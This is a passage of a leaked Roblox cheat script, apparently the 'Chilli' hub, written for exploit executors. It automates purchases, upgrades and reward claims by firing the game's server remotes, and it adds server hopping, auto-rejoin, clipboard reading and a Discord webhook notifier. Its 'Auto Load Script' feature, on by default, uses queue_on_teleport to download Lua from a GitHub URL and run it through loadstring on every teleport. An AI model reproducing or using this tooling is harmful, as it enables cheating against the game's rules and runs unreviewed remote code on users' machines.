			for _, item in ipairs(items) do
				n27 += item.Scale
			end

			local n28 = n27 / #items
			local value534 = func627(items[1].Category, n28)
			local hint3 = paint2(color2.Hint, "Average Scale") .. "  " .. bold2(paint2(color2.Scale, string.format("%.2fx", n28)))

			if value534 then
				hint3 ..= str39.Separator() .. paint2(color2.Weight, str39.FormatWeight(value534))
			end

			func643(hint3, false)
			local value535 = nil

			for _, item in ipairs(items) do
				local mutations4 = func628(item.Mutations)

				if mutations4 then
					if (value535 and str39.MutationMultiplier({ value535 }) or 0) < str39.MutationMultiplier({ mutations4 }) then
						value535 = mutations4
					end
				end
			end

			local tbl486 = value535 and { value535 } or {}
			func644("PREDICTED SIZE PROBABILITIES", color2.Income)

			if #items == 3 then
				local tbl487 = { items[1].Scale, items[2].Scale, items[3].Scale }
				local tbl488 = {}
				local n29 = 0

				for _, item171 in ipairs(func629()) do
					local n30 = item171.weight * func630(tbl487, item171.min, item171.max)
					n29 += n30
					table.insert(tbl488, { Min = item171.min, Max = item171.max, Weight = n30, Color = func626(item171.min) })
				end

				table.sort(tbl488, function(param367, param368)
					return param367.Weight > param368.Weight
				end)

				local first6 = tbl488[1]

				for _, item172 in ipairs(tbl488) do
					local n30 = n29 > 0 and item172.Weight / n29 * 100 or 0
					local str58 = bold2(paint2(item172.Color, string.format("%.2fx - %.2fx", item172.Min, item172.Max)))
					local flag615 = func627(items[1].Category, item172.Min)
					local value536 = func627(items[1].Category, item172.Max)

					if flag615 and value536 then
						local weight = color2.Weight
						local format = string.format
						local formatWeight = str39.FormatWeight
						str58 ..= str39.Separator() .. paint2(weight, format("%s - %s", str39.FormatWeight(flag615), formatWeight(value536)))
					end

					local separat2 = str39.Separator()
					local income = n30 >= 10 and color2.Income

					if not income then
						income = n30 >= 1 and color2.Clock or color2.Hint
					end

					func643(str58 .. separat2 .. bold2(paint2(income, string.format(n30 >= 1 and "%.1f%%" or "%.3f%%", n30))), false)
				end

				func644("RESULT PREDICTION", color2.Text)
				func643(paint2(color2.Hint, "Predicted Mutation") .. "  " .. (value535 and str39.MutationText(tbl486) or paint2(color2.Text, "Normal")), false)

				if first6 then
					func643(paint2(color2.Hint, "Estimated Value") .. "  " .. bold2(paint2(color2.Income, str39.FormatRate(str39.Income(value532, first6.Min, tbl486)) .. " ~ " .. str39.FormatRate(str39.Income(value532, first6.Max, tbl486)))) .. str39.Separator() .. paint2(color2.Hint, "at ") .. bold2(paint2(first6.Color, string.format("%.2fx - %.2fx", first6.Min, first6.Max))), false)
				end

				local value537, value538, value539 = ipairs(tbl488)
				local value540 = nil

				for _, value541 in value537, value538, value539 do
					if not value540 or value541.Max > value540.Max then
						value540 = value541
					end
				end

				if value540 then
					func643(paint2(color2.Hint, "Best Case") .. "  " .. bold2(paint2(value540.Color, string.format("%.2fx - %.2fx", value540.Min, value540.Max))) .. "  " .. bold2(paint2(color2.Income, str39.FormatRate(str39.Income(value532, value540.Max, tbl486)))), false)
				end
			else
				func643(paint2(color2.Hint, string.format("Load %d more of the same species to see the odds", 3 - #result97.Items)), false)
			end
		end

		for i = n25 + 1, #tbl478 do
			tbl478[i].Set({ Visible = false })
		end

		for i = n26 + 1, #tbl477 do
			tbl477[i].Frame.Set({ Visible = false })
		end

		func641()
		n24 = 2
	end

	if not str39.Ready then
		obj79:CreateText({ Name = "Fuse Predictor", Text = "Update the Chilli Library to use the predictor canvas." })
	else
		local obj100 = obj79:CreateCanvas({
			Name = "Fuse Predictor",
			Layout = "free",
			Style = {
				TextScale = 0.84,
				LineHeight = 1.1,
				MinLines = 16,
				MaxLines = 34,
				BackgroundTransparency = 0.5,
				ScrollBarColor = Color3.fromRGB(170, 174, 184),
				TextColor = Color3.fromRGB(255, 255, 255),
				TextStrokeTransparency = 0.7,
			},
			Build = function(param369)
				func635(param369)

				if type(str39.RequestEggRefresh) == "function" then
					str39.RequestEggRefresh()
				end
			end,
		})

		str39.RefreshFuse = refreshFuse

		str39.PlaceFuse = function()
			if n24 > 0 or flag604 then
				if n24 > 0 then
					n24 -= 1
				end

				pcall(func641)
			end
		end

		func4(function()
			obj100:Destroy()
		end)
	end
end

local obj101
obj101 = obj2:CreateTab({ Name = "Progress", SectionsExpanded = true }):CreateSection({ Name = "Auto Progression", Expanded = true })

do
	local tbl489 = {}
	local tbl490

	tbl490 = {
		Remote = function(childName17)
			local entry51 = tbl489[childName17]
			if entry51 ~= nil then
				return entry51 or nil
			end
			local flag616 = networking:FindFirstChild(childName17)
			tbl489[childName17] = flag616 or false
			return flag616
		end,
		Invoke = function(param370, ...)
			local obj102 = tbl490.Remote(param370)
			if not obj102 or not obj102:IsA("RemoteFunction") then
				return false, nil
			end
			local ok, result = pcall(obj102.InvokeServer, obj102, ...)
			return ok, result
		end,
		Fire = function(param371, ...)
			local obj103 = tbl490.Remote(param371)
			if not obj103 or not obj103:IsA("RemoteEvent") then
				return false
			end
			return pcall(obj103.FireServer, obj103, ...)
		end,
	}

	local function saveData()
		local save = tbl1.Save
		if type(save) ~= "table" or type(save.Get) ~= "function" then
			return nil
		end
		local ok, result = pcall(save.Get)
		return ok and type(result) == "table" and result or nil
	end

	tbl490.SaveData = saveData
	local tbl491 = { "Money", "Cash", "Coins", "Currency", "Balance" }

	tbl490.Money = function()
		local result98 = saveData()

		if result98 then
			for _, item173 in ipairs(tbl491) do
				local num146 = tonumber(result98[item173])
				if num146 then
					return num146
				end
			end
		end

		local leaderstats = localPlayer:FindFirstChild("leaderstats")

		if leaderstats then
			for _, item174 in ipairs(tbl491) do
				local flag617 = leaderstats:FindFirstChild(item174)
				if flag617 and tonumber(flag617.Value) then
					return tonumber(flag617.Value)
				end
			end
		end

		return nil
	end

	tbl490.AddWorker = tbl2.Add
	tbl490.Backoff = tbl2.Backoff

	local tbl492 = {
		"Money",
		"BaseUpgradeLevel",
		"TreadmillUpgradeLevel",
		"TrailInventory",
		"PendingOfflineMoney",
	}
	-- 𝚂𝚘𝚞𝚛𝚌𝚎 𝙻𝚎𝚊𝚔 | https://discord.gg/x7YbZeezpm

	local save = tbl1.Save

	if type(save) == "table" and type(save.FieldSignal) == "function" then
		for _, item175 in ipairs(tbl492) do
			local ok, result = pcall(save.FieldSignal, item175)

			if ok and type(result) == "table" and type(result.Connect) == "function" then
				local ok2, result2 = pcall(result.Connect, result, function()
					tbl2.Wake()
				end)

				if ok2 and result2 then
					func4(function()
						pcall(function()
							result2:Disconnect()
						end)
					end)
				end
			end
		end
	end

	local value542 = nil
	local value543 = nil
	local tbl493 = {}

	local function func645()
		local value544 = func2(function()
			return ReplicatedStorage.Data.Trails
		end)

		local directory = type(value544) == "table" and value544.Directory or nil
		if type(directory) ~= "table" then
			return {}
		end
		local tbl494 = {}

		for k, value545 in pairs(directory) do
			if type(value545) == "table" then
				local insert = table.insert
				local tbl495 = {}
				local func646 = tostring
				k = value545._id or k
				tbl495.Id = func646(k)
				tbl495.Price = tonumber(value545.Price) or math.huge
				insert(tbl494, tbl495)
			end
		end

		table.sort(tbl494, function(param372, param373)
			return param372.Price < param373.Price
		end)

		return tbl494
	end

	local function func647(param374)
		if not flag2.ReadToggle(value542, false) then
			return false
		end
		value543 = value543 or func645()
		local flag618 = tbl490.SaveData()
		if not flag618 or #value543 == 0 then
			return false
		end
		local trailInventory = type(flag618.TrailInventory) == "table" and flag618.TrailInventory or {}
		local n13 = tonumber(flag618.Money) or 0

		for _, item176 in ipairs(value543) do
			if trailInventory[item176.Id] ~= true and not tbl493[item176.Id] and item176.Price <= n13 then
				local AskPurchase, flag619 = tbl490.Invoke("RF/Trailwear/AskPurchase", item176.Id)
				if AskPurchase and flag619 ~= false then
					return true
				end
				tbl493[item176.Id] = true
				tbl490.Backoff(param374)
				return false
			end
		end

		return false
	end

	value542 = obj101:CreateToggle({
		Name = "Auto Buy Trail",
		Note = "Automatically buy available trails when affordable",
		Default = false,
		Callback = function()
			table.clear(tbl493)
			value543 = nil
		end,
	})

	tbl490.AddWorker(func647)
	local value546 = nil

	local function func648()
		if not flag2.ReadToggle(value546, false) then
			return false
		end
		local flag620 = tbl490.SaveData()
		if not flag620 then
			return false
		end

		local value547 = func2(function()
			return ReplicatedStorage.Data.Bases
		end)

		local bases = type(value547) == "table" and value547.BASES or nil
		if type(bases) ~= "table" then
			return false
		end
		local n13 = tonumber(flag620.BaseUpgradeLevel) or 0
		local ok = nil

		if type(value547.GetMaxBaseLevel) == "function" then
			local result
			ok, result = pcall(value547.GetMaxBaseLevel)
			ok = ok and tonumber(result) or nil
		end

		if ok and n13 >= ok then
			return false
		end
		local entry52 = bases[n13 + 1]
		local num147 = type(entry52) == "table" and tonumber(entry52.Cost) or nil

		if num147 then
			num147 = (tonumber(flag620.Money) or 0) >= num147
		end

		if num147 then
			return tbl490.Fire("RE/Homestead/AskBaseTierRaise")
		end
		return false
	end

	value546 = obj101:CreateToggle({
		Name = "Auto Upgrade Base",
		Note = "Automatically upgrade base when money is available",
		Default = false,
	})

	tbl490.AddWorker(func648)
	local value548 = nil

	local function func649()
		if not flag2.ReadToggle(value548, false) then
			return false
		end
		local flag621 = tbl490.SaveData()
		if not flag621 then
			return false
		end

		local value549 = func2(function()
			return ReplicatedStorage.Data.Treadmills
		end)

		if type(value549) ~= "table" or type(value549.GetByUpgradeLevel) ~= "function" then
			return false
		end
		local ok, result = pcall(value549.GetByUpgradeLevel, (tonumber(flag621.TreadmillUpgradeLevel) or 0) + 1)
		if not ok or type(result) ~= "table" then
			return false
		end
		local id = result._id
		local huge = tonumber(result.Price) or math.huge
		local flag622 = type(id) == "string"

		if flag622 then
			flag622 = (tonumber(flag621.Money) or 0) >= huge
		end

		if flag622 then
			local AskTierRaise, flag623 = tbl490.Invoke("RF/Treadmill/AskTierRaise", id)
			return AskTierRaise and flag623 ~= false
		end
		return false
	end

	value548 = obj101:CreateToggle({
		Name = "Auto Upgrade Treadmill",
		Note = "Automatically upgrade treadmill when money is available",
		Default = false,
	})

	tbl490.AddWorker(func649)
	local n13 = 15
	local value550 = nil
	local n14 = 15
	local now = os.clock()

	local function func650()
		if not flag2.ReadToggle(value550, false) then
			return false
		end
		local now2 = os.clock()
		n14 += now2 - now
		now = now2
		local flag624 = tbl490.SaveData()
		local flag625 = flag624 and tonumber(flag624.PendingOfflineMoney) or nil

		if flag625 == nil then
			local flag626
			flag625, flag626 = tbl490.Invoke("RF/AwayEarnings/PendingCheck")
			flag625 = flag625 and flag626 ~= false and flag626 ~= nil and 1 or 0
		end

		local flag627 = flag625 > 0
		local flag628 = false

		if flag627 then
			local flag629
			flag628, flag629 = tbl490.Invoke("RF/AwayEarnings/AskCollect")
			flag628 = flag628 and flag629 ~= false
		end

		if n14 >= n13 then
			n14 = 0
			local AskRedeemAll, flag630 = tbl490.Invoke("RF/Codex/AskRedeemAll")
			flag628 = flag628 or AskRedeemAll and flag630 ~= false
			tbl490.Invoke("RF/Codex/AskRedeemLimitedEgg")
		end

		return flag628
	end

	value550 = obj101:CreateToggle({
		Name = "Auto Claim",
		Note = "Claim offline money & index rewards",
		Default = false,
		Callback = function()
			n14 = n13
		end,
	})

	tbl490.AddWorker(func650)
end

str1.IndexClaimHandle = obj101:CreateToggle({
	Name = "Auto Claim Index",
	Note = "Claim index rewards as soon as they unlock",
	Default = false,
	Callback = function()
		if type(str1.IndexClaimRestart) == "function" then
			str1.IndexClaimRestart()
		end
	end,
})

local func651

func651 = function(param375, param376)
	if type(obj1.Notify) == "function" then
		pcall(obj1.Notify, param375, param376, 5)
	end
end

local obj104
obj104 = obj2:CreateTab({ Name = "Server", SectionsExpanded = true }):CreateSection({ Name = "Server", Expanded = true })
local TeleportService
TeleportService = game:GetService("TeleportService")
local HttpService
HttpService = game:GetService("HttpService")
local GuiService
GuiService = game:GetService("GuiService")

do
	local function func652()
		if type(queue_on_teleport) == "function" then
			return queue_on_teleport
		end

		if type(queueonteleport) == "function" then
			return queueonteleport
		end

		if type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
			return syn.queue_on_teleport
		end

		if type(fluxus) == "table" and type(fluxus.queue_on_teleport) == "function" then
			return fluxus.queue_on_teleport
		end
		return nil
	end

	local function func653(flag631)
		pcall(function()
			TeleportService:SetTeleportSetting("__ChilliAutoLoadScriptEnabled", flag631)
		end)

		if not flag631 then
			return true
		end
		local result99 = func652()
		if not result99 then
			return false
		end

		if rawget(_G, "__ChilliAutoLoadQueued") ~= true then
			if not pcall(result99, [[local TeleportService = game:GetService("TeleportService")
local enabled = true
pcall(function()
    enabled = TeleportService:GetTeleportSetting("__ChilliAutoLoadScriptEnabled") == true
end)
if enabled then
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    pcall(function()
        local player = game:GetService("Players").LocalPlayer
        if player and not player.Character then
            player.CharacterAdded:Wait()
        end
    end)
    task.wait(1.5)
    local ok, source = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua")
    end)
    if ok and type(source) == "string" then
        local chunk = loadstring(source)
        if chunk then
            chunk()
        end
    end
end
]]) then
				return false
			end

			_G.__ChilliAutoLoadQueued = true
		end

		return true
	end

	local value551 = nil

	local function func654()
		if value551 and str1.Toggle(value551, false) then
			func653(true)
		end
	end

	value551 = obj104:CreateToggle({
		Name = "Auto Load Script",
		Default = true,
		Callback = function(value)
			local flag632 = value == true

			if not func653(flag632) and flag632 then
				task.defer(function()
					func653(false)

					if value551 and type(value551.Set) == "function" then
						pcall(value551.Set, value551, false, false)
					end

					func651("Auto Load Unavailable", "This executor does not support queue on teleport.")
				end)
			end
		end,
	})

	local str59 = "Least Players"
	local n13 = 10
	local n14 = 0
	local value552 = nil
	local tbl496 = {}
	local flag633 = false
	local n15 = 0
	local flag634 = false
	local value553 = nil
	local str60 = ""
	local n16 = 0
	local n17 = 60

	local function func655(param377)
		n14 = 0
		value552 = nil

		if param377 then
			tbl496[param377] = true
		end
	end

	pcall(function()
		TeleportService.TeleportInitFailed:Connect(function(param378, param379, flag635)
			if not value552 then
				return
			end
			func655(value552)
			flag634 = true

			if not flag633 then
				func651("Server Hop Failed", tostring(flag635 ~= "" and flag635 or param379))
			end
		end)
	end)

	local function func656(flag636)
		local str61 = tostring(game.JobId or "")
		local list72 = {}
		local flag637 = flag636 == "Random"
		local str62 = flag636 == "Least Players" and "Asc" or "Desc"
		local n18 = flag637 and 3 or 6
		local nextPageCursor = nil

		for i = 1, n18 do
			local formatted20 = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&excludeFullGames=true&limit=100", game.PlaceId, str62)

			if nextPageCursor and nextPageCursor ~= "" then
				formatted20 ..= "&cursor=" .. HttpService:UrlEncode(nextPageCursor)
			end

			local ok, result = pcall(function()
				return HttpService:JSONDecode(game:HttpGet(formatted20))
			end)

			if not ok or type(result) ~= "table" then
				return list72, false
			end
			local func657 = ipairs
			local data = result.data or {}

			for _, value554 in func657(data) do
				local str63 = tostring(value554.id or "")
				local huge = tonumber(value554.playing) or math.huge
				local n19 = tonumber(value554.maxPlayers) or 0

				if str63 ~= "" and str63 ~= str61 and huge < n19 then
					list72[#list72 + 1] = { Id = str63, Playing = huge, Room = n19 - huge }
				end
			end

			if #list72 > 0 and not flag637 then
				break
			end
			nextPageCursor = result.nextPageCursor
			if not nextPageCursor or nextPageCursor == "" then
				break
			end
		end

		return list72, true
	end

	local function serverHop(flag638)
		local value555

		if value553 and str60 == flag638 and os.clock() - n16 < n17 then
			value555 = value553
		else
			local flag639
			value555, flag639 = func656(flag638)
			if not flag639 then
				return "fetch"
			end
			value553 = value555
			str60 = flag638
			n16 = os.clock()
		end

		local function func658(param380)
			local list73 = {}

			for _, item177 in ipairs(value555) do
				if not tbl496[item177.Id] and item177.Room >= param380 then
					list73[#list73 + 1] = item177
				end
			end

			return list73
		end

		local list74 = func658(2)

		if #list74 == 0 then
			list74 = func658(1)
		end

		if #list74 == 0 and next(tbl496) ~= nil then
			table.clear(tbl496)
			list74 = func658(1)
		end

		if #list74 == 0 then
			func655(nil)
			value553 = nil
			return "empty"
		end

		local id

		if flag638 == "Random" then
			id = list74[math.random(1, #list74)].Id
		else
			table.sort(list74, function(param381, param382)
				if flag638 == "Least Players" then
					return param381.Playing < param382.Playing
				end
				return param381.Playing > param382.Playing
			end)

			id = list74[1].Id
		end

		flag634 = false
		value552 = id
		n14 = os.clock() + n13
		pcall(func654)

		if not pcall(function()
			TeleportService:TeleportToPlaceInstance(game.PlaceId, id, localPlayer)
		end) then
			func655(id)
			return "failed"
		end

		local n18 = os.clock() + n13

		while os.clock() < n18 do
			if flag634 then
				return "denied"
			end
			task.wait(0.25)
		end

		return "waiting"
	end

	str1.ServerHop = serverHop

	obj104:CreateDropdown({
		Name = "Server Hop Mode",
		Options = { "Most Players", "Random", "Least Players" },
		Default = "Least Players",
		Callback = function(value)
			str59 = tostring(value or "Least Players")
		end,
	})

	obj104:CreateButton({
		Name = "Server Hop",
		ButtonText = "Hop",
		Callback = function()
			n15 += 1
			local flag640 = n15

			task.spawn(function()
				flag633 = true
				local n18 = 0

				while flag640 == n15 do
					n18 += 1
					local flag641 = serverHop(str59)

					if not (flag641 == "waiting" or flag640 ~= n15) then
						if flag641 == "empty" then
							value553 = nil
							table.clear(tbl496)
						end

						if n18 % 10 == 0 then
							func651("Server Hop", string.format("Every server was full so far, %d tries.", n18))
						end

						task.wait(flag641 == "fetch" and 1 or 0.1)
						continue
					end

					break
				end

				if flag640 == n15 then
					flag633 = false
				end
			end)
		end,
	})
end

do
	local n13 = 8
	local n14 = 0
	local str64 = ""
	local value556 = nil

	local function func659()
		return os.clock() < n14
	end

	local function func660(flag642)
		n14 = flag642 and os.clock() + n13 or 0
	end

	local function func661(flag643)
		local match = tostring(flag643 or ""):match("^%s*(.-)%s*$")
		return match:match("%x%x%x%x%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%-%x%x%x%x%x%x%x%x%x%x%x%x") or match
	end

	local function func662()
		local value557 = str64
		local result = str64

		if value556 then
			local ok

			ok, result = pcall(function()
				local controller = value556._controller
				return controller and controller.GetValue and controller.GetValue()
			end)

			if not (ok and type(result) == "string" and result ~= "") then
				local exitTo = nil

				for _, item178 in ipairs({ "Get", "GetValue", "GetText" }) do
					local ok2, result2 = pcall(function()
						return value556[item178]
					end)

					if ok2 and type(result2) == "function" then
						local ok3
						ok3, result = pcall(result2, value556)
						if ok3 and type(result) == "string" and result ~= "" then
							exitTo = 1
							break
						end
					end
				end

				if exitTo ~= 1 then
					result = value557
				end
			end
		end

		local flag644 = func661(result)

		if flag644 == "" then
			local ok, result2 = pcall(function()
				local func663 = getclipboard or readclipboard or getrbxclipboard
				return type(func663) == "function" and func663() or nil
			end)

			if ok and type(result2) == "string" then
				flag644 = func661(result2)
			end
		end

		return flag644
	end

	local function func664(param383)
		if not value556 then
			return
		end

		pcall(function()
			local controller = value556._controller

			if controller and controller.SetValue then
				controller.SetValue(param383, false)
			end
		end)

		str64 = func661(param383)
	end

	local function func665(param384)
		func660(true)
		pcall(AutoLoadBeforeTeleport)

		if not pcall(function()
			if game.JobId ~= "" then
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
			else
				TeleportService:Teleport(game.PlaceId, localPlayer)
			end
		end) then
			func660(false)
			func651(param384, "Roblox could not rejoin the server.")
		end
	end

	pcall(function()
		TeleportService.TeleportInitFailed:Connect(function(param385, param386, flag645)
			if not func659() then
				return
			end
			func660(false)
			func651("Teleport Failed", tostring(flag645 ~= "" and flag645 or param386))
		end)
	end)

	value556 = obj104:CreateInput({
		Name = "Job ID",
		Placeholder = "Paste a server Job ID...",
		Default = "",
		MaxLength = 100,
		Callback = function(value)
			str64 = func661(value)
		end,
	})

	if value556 then
		value556._configIgnored = true

		if value556.State and not value556.State._registered then
			value556.State._configIgnored = true
		end
	end

	obj104:CreateButton({
		Name = "Join Job ID",
		ButtonText = "Join",
		Callback = function()
			if func659() then
				func651("Join Job ID Failed", "A teleport is already running, try again shortly.")
				return
			end
			local result100 = func662()
			if result100 == "" then
				func651("Join Job ID Failed", "Paste a valid Job ID first.")
				return
			end
			func660(true)
			pcall(AutoLoadBeforeTeleport)

			if not pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, result100, localPlayer)
			end) then
				func660(false)
				func651("Join Job ID Failed", "Roblox could not join that server.")
			end
		end,
	})

	obj104:CreateButton({
		Name = "Copy Current Job ID",
		ButtonText = "Copy",
		Callback = function()
			local str65 = tostring(game.JobId or "")
			func664(str65)
			local value558 = setclipboard or toclipboard
			func651((type(value558) == "function" and pcall(value558, str65) or false) and "Job ID Copied" or "Job ID Shown", str65)
		end,
	})

	obj104:CreateButton({
		Name = "Rejoin Server",
		ButtonText = "Rejoin",
		Callback = function()
			if func659() then
				func651("Rejoin Failed", "A teleport is already running, try again shortly.")
				return
			end
			func665("Rejoin Failed")
		end,
	})

	local tbl497 = { Option = nil, Fired = false, TeleportingAt = 0 }

	local function func666()
		local robloxPromptGui = CoreGui:FindFirstChild("RobloxPromptGui")
		local promptOverlay = robloxPromptGui and robloxPromptGui:FindFirstChild("promptOverlay")
		return promptOverlay ~= nil and promptOverlay:FindFirstChild("ErrorPrompt") ~= nil
	end

	pcall(function()
		local connection = localPlayer.OnTeleport:Connect(function(flag646)
			if flag646 == Enum.TeleportState.Failed then
				tbl497.TeleportingAt = 0
			else
				tbl497.TeleportingAt = os.clock()
			end
		end)

		func4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)
	end)

	tbl497.Option = obj104:CreateToggle({ Name = "Auto Rejoin When Disconnect", Default = true })

	local function func667(flag647)
		if tbl497.Fired or tbl497.Option == nil or not str1.Toggle(tbl497.Option, false) or func659() then
			return
		end
		local flag648 = tbl497.TeleportingAt > 0

		if flag648 then
			local teleportingAt = tbl497.TeleportingAt
			flag648 = os.clock() - teleportingAt < 60
		end

		if flag648 then
			return
		end
		local lowered7 = string.lower(tostring(flag647 or ""))
		if lowered7 == "" or string.find(lowered7, "teleport", 1, true) then
			return
		end
		local errorCode = nil

		pcall(function()
			errorCode = GuiService:GetErrorCode()
		end)

		if errorCode == Enum.ConnectionError.DisconnectDuplicatePlayer or string.find(lowered7, "banned", 1, true) or string.find(lowered7, "same account", 1, true) then
			return
		end
		tbl497.Fired = true
		local placeId = game.PlaceId
		local str66 = tostring(game.JobId or "")
		local foundAt4 = string.find(lowered7, "shut", 1, true) ~= nil or string.find(lowered7, "no longer", 1, true) ~= nil or string.find(lowered7, "closed", 1, true) ~= nil
		pcall(AutoLoadBeforeTeleport)
		func651("Auto Rejoin", foundAt4 and "Server closed, joining another one." or "Disconnected, rejoining now.")

		task.spawn(function()
			local n15 = 0

			while true do
				n15 += 1
				local flag649 = not foundAt4 and str66 ~= "" and n15 <= 2

				pcall(function()
					if flag649 then
						TeleportService:TeleportToPlaceInstance(placeId, str66, localPlayer)
					else
						TeleportService:Teleport(placeId, localPlayer)
					end
				end)

				task.wait(flag649 and 4 or 5)
			end
		end)
	end

	pcall(function()
		local connection = GuiService.ErrorMessageChanged:Connect(function(param387)
			task.wait(0.3)

			if func666() then
				func667(param387)
			end
		end)

		func4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)
	end)

	task.spawn(function()
		local robloxPromptGui = CoreGui:WaitForChild("RobloxPromptGui", 30)
		robloxPromptGui = robloxPromptGui and robloxPromptGui:WaitForChild("promptOverlay", 30)
		if not robloxPromptGui then
			return
		end

		local connection = robloxPromptGui.ChildAdded:Connect(function(child)
			if child.Name ~= "ErrorPrompt" then
				return
			end
			task.wait(0.2)
			local str67 = ""

			for _, descendant in ipairs(child:GetDescendants()) do
				if descendant:IsA("TextLabel") and descendant.Name == "ErrorMessage" then
					str67 = descendant.Text
				end
			end

			if str67 == "" then
				pcall(function()
					str67 = GuiService:GetErrorMessage()
				end)
			end

			func667(str67 ~= "" and str67 or "disconnected")
		end)

		func4(function()
			pcall(function()
				connection:Disconnect()
			end)
		end)
	end)
end

do
	local AssetService = game:GetService("AssetService")
	local request_ = syn and syn.request or http and http.request or http_request or request

	local tbl498 = {
		Url = "",
		Stolen = false,
		PingEveryone = false,
		Queue = {},
		Sending = false,
		Notified = {},
		Icons = {},
		Pngs = {},
		Crc = {},
		Known = nil,
		Carry = nil,
		Avatar = nil,
		Disposed = false,
		Path = "ChilliLibrary/SAE_Webhook.txt",
		Saved = "",
		LoadedAt = os.clock(),
		Input = nil,
		Dot = "  " .. utf8.char(183) .. "  ",
		MaxSide = 200,
		Logo = "https://media.discordapp.net/attachments/1181785068637790221/1551685385665380432/chilli.png?ex=6ab2df20&is=6ab18da0&hm=5ca4b16854493c689912c068c29354752a0f2ea0490d5b22cbd9acf7d26ed7eb&=&format=webp&quality=lossless",
		Emoji = {
			Value = "<:sae_value:1551645680718581871>",
			Size = "<:sae_size:1551645444285800558>",
			Mutation = "<:sae_mutation:1551677914146275478>",
			Area = "<:sae_area:1551675973328441416>",
		},
	}

	pcall(function()
		if type(readfile) ~= "function" then
			return
		end

		if type(isfile) == "function" and not isfile(tbl498.Path) then
			return
		end
		local cleaned4 = string.gsub(tostring(readfile(tbl498.Path) or ""), "%s", "")
		tbl498.Saved = cleaned4
		tbl498.Url = cleaned4
	end)

	for i = 0, 255 do
		local value559 = i

		for i2 = 1, 8 do
			if bit32.band(value559, 1) == 1 then
				value559 = bit32.bxor(3988292384, bit32.rshift(value559, 1))
			else
				value559 = bit32.rshift(value559, 1)
			end
		end

		tbl498.Crc[i] = value559
	end

	local function func668(param388)
		if type(param388) ~= "string" then
			return false
		end

		for _, item179 in ipairs({ "discord%.com", "discordapp%.com", "ptb%.discord%.com", "canary%.discord%.com" }) do
			if string.match(param388, "^https://" .. item179 .. "/api/webhooks/%d+/[%w%-_]+$") then
				return true
			end
		end

		return false
	end

	local function func669(param389)
		if type(request_) ~= "function" then
			return nil
		end
		local ok, result = pcall(request_, { Url = param389, Method = "GET" })
		if not ok or type(result) ~= "table" or tonumber(result.StatusCode) ~= 200 then
			return nil
		end
		local ok2, result2 = pcall(HttpService.JSONDecode, HttpService, tostring(result.Body))
		return ok2 and result2 or nil
	end

	local function func670(param390, flag650)
		local flag651 = type(param390) == "table" and type(param390.data) == "table" and param390.data[1] or nil
		if type(flag651) ~= "table" or flag651.state ~= "Completed" or type(flag651.imageUrl) ~= "string" or flag651.imageUrl == "" then
			return nil
		end

		if flag650 and not string.find(flag651.imageUrl, "/Image/", 1, true) then
			return nil
		end
		return flag651.imageUrl
	end

	local function func671(str68)
		if tbl498.Icons[str68] == nil then
			tbl498.Icons[str68] = func670(func669("https://thumbnails.roblox.com/v1/assets?assetIds=" .. str68 .. "&returnPolicy=PlaceHolder&size=420x420&format=Png&isCircular=false"), true) or false
		end

		return tbl498.Icons[str68] or nil
	end

	local function func672()
		if tbl498.Avatar == nil then
			tbl498.Avatar = func670(func669("https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. localPlayer.UserId .. "&size=150x150&format=Png&isCircular=false")) or false
		end

		return tbl498.Avatar or nil
	end

	local function func673(param391, param392, param393)
		local crc = tbl498.Crc
		local n13 = 4294967295

		for i = param392, param393 do
			local rshift = bit32.rshift
			n13 = bit32.bxor(crc[bit32.band(bit32.bxor(n13, buffer.readu8(param391, i)), 255)], rshift(n13, 8))
		end

		return bit32.bxor(n13, 4294967295)
	end

	local function func674(param394, num148, num149)
		local n13 = num148 * 4 + 1
		local n14 = n13 * num149
		local n15 = 2 + math.ceil(n14 / 65535) * 5 + n14 + 4
		local arr4 = buffer.create(45 + n15 + 12)
		local n16 = 0

		local function func675(param395)
			buffer.writeu8(arr4, n16, param395)
			n16 += 1
		end

		local function func676(param396)
			func675(bit32.band(bit32.rshift(param396, 24), 255))
			func675(bit32.band(bit32.rshift(param396, 16), 255))
			func675(bit32.band(bit32.rshift(param396, 8), 255))
			func675(bit32.band(param396, 255))
		end

		local function func677(param397, param398, param399, param400)
			func675(param397)
			func675(param398)
			func675(param399)
			func675(param400)
		end

		for _, item180 in ipairs({ 137, 80, 78, 71, 13, 10, 26, 10 }) do
			func675(item180)
		end

		func676(13)
		func677(73, 72, 68, 82)
		func676(num148)
		func676(num149)
		func675(8)
		func675(6)
		func675(0)
		func675(0)
		func675(0)
		func676(func673(arr4, n16, n16 - 1))
		local arr5 = buffer.create(n14)

		for i = 0, num149 - 1 do
			buffer.writeu8(arr5, i * n13, 0)
			buffer.copy(arr5, i * n13 + 1, param394, i * num148 * 4, num148 * 4)
		end

		func676(n15)
		local value560 = n16
		func677(73, 68, 65, 84)
		func675(120)
		func675(1)
		local n17 = 0

		while n17 < n14 do
			local n18 = math.min(65535, n14 - n17)
			func675(n17 + n18 >= n14 and 1 or 0)
			func675(bit32.band(n18, 255))
			func675(bit32.rshift(n18, 8))
			local b2 = bit32.band(bit32.bnot(n18), 65535)
			func675(bit32.band(b2, 255))
			func675(bit32.rshift(b2, 8))
			buffer.copy(arr4, n16, arr5, n17, n18)
			n16 += n18
			n17 += n18
		end

		local n18 = 1
		local n19 = 0

		for i = 0, n14 - 1 do
			n18 = (n18 + buffer.readu8(arr5, i)) % 65521
			n19 = (n19 + n18) % 65521
		end

		func676(n19 * 65536 + n18)
		func676(func673(arr4, value560, n16 - 1))
		func676(0)
		func677(73, 69, 78, 68)
		func676(func673(arr4, n16, n16 - 1))
		return buffer.tostring(arr4)
	end

	local function func678(str69)
		if tbl498.Pngs[str69] ~= nil then
			return tbl498.Pngs[str69] or nil
		end

		local ok, result = pcall(function()
			local obj105 = AssetService:CreateEditableImageAsync(Content.fromUri("rbxassetid://" .. str69))
			local size = obj105.Size
			local n13 = math.floor(size.X)
			local n14 = math.floor(size.Y)
